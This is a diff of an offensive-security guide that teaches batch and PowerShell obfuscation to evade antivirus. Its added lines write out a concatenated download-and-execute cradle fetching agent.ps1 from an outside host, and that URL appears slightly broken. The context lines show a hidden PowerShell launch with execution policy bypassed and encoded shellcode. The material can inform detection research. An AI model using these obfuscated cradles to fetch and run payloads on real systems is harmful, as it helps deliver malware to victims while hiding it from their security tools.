@@ -55,7 +55,7 @@ The above string can be obfuscated using the **batch special caracter: ^** <br /
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
 
-- Using one batch local variable to serve as our **master key** (%varObj%) - **file: template.bat**<br />
+- Using one batch local variable to serve as our **master key** (%varObj%) **file: template.bat**<br />
 
       @echo off
       SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
@@ -108,12 +108,16 @@ The above string can be obfuscated using the **powershell special caracter: `**<
 
 - String command to obfuscate<br />
 `powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
-The above string can be obfuscated using **powershell special caracters:** **`** and **+** and **$var**<br />
+The above string can be obfuscated using **powershell special caracters:** **`** and **+** and **$var** and **'**<br />
 
 - String obfuscated<br />
 
       $get = New-Object "N`et`Web`Cl`ie`nt"
       p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
+
+<br />
+
+      po'+'wer'+'shell.exe IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//19'+'2.16'+'8.1'+'.71/agent.ps1')
 
 ![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
 
@@ -267,6 +271,10 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 **@404death** **@Wandoelmo Silva** **@daniel sauder(avet)**
 
 <br />
+
+
+### Referencies
+https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
 
 **Author: r00t-3xp10it**<br />
 **If you know more of this technics, fell free to report them ^_^**<br />
